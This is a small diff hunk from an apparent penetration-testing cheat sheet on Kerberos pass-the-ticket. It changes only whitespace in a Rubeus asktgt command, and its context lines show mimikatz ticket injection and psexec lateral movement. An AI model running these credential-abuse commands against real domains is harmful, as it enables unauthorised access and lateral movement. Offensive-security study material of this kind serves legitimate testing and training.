@@ -318,7 +318,7 @@ mimikatz> kerberos::ptt [ticket_name.kirbi]  # inject into memory
 cmd> psexec.exe \\target.hostname.com cmd    # authN to remote target using ticket
 
 # METHOD 2: Rubeus
-cmd> Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
+cmd> Rubeus.exe  asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
 ```
 
 PTT via. KALI (exporting -> cache as env var -> psexec.py/smbexec.py/wmiexec.py)
